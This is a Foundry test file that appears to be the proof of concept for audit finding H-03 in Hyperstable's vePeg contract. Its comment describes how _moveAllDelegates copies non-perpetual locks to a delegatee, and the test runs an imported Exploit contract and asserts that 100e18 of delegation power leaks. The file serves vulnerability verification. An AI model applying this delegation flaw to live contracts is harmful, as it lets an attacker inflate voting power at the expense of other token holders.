// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, vePeg, MarkerToken} from "./57824-h-03-non-perpetual-locks-gaining-extra-delegation-power-pash.sol";

// Hyperstable H-03 (finding 57824): vePeg._delegate gates only the source token
// `_from` on perpetuallyLocked, but _moveAllDelegates copies ALL of the owner's
// locks (incl. non-perpetual) into the delegatee. 1 perpetual (100e18) + 2
// non-perpetual (50e18 each) -> delegatee gains 200e18, leaking 100e18 of
// non-perpetual delegation power.
contract Finding57824Test is Test {
    function test_exploit_nonPerpetualLocksLeakDelegationPower() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("intended (perpetual only)", e.perpetualPower());
        emit log_named_uint("actual delegated power", e.delegatedPower());
        emit log_named_uint("leaked (non-perpetual) power", e.leakedPower());

        assertEq(e.perpetualPower(), 100 ether, "intended power = perpetual lock only");
        assertEq(e.delegatedPower(), 200 ether, "delegatee got ALL locks");
        assertEq(e.leakedPower(), 100 ether, "100e18 non-perpetual power leaked");
        assertEq(e.marker().balanceOf(0x000000000000000000000000000000000000D00d), 100 ether, "harm marker recorded");
    }
}
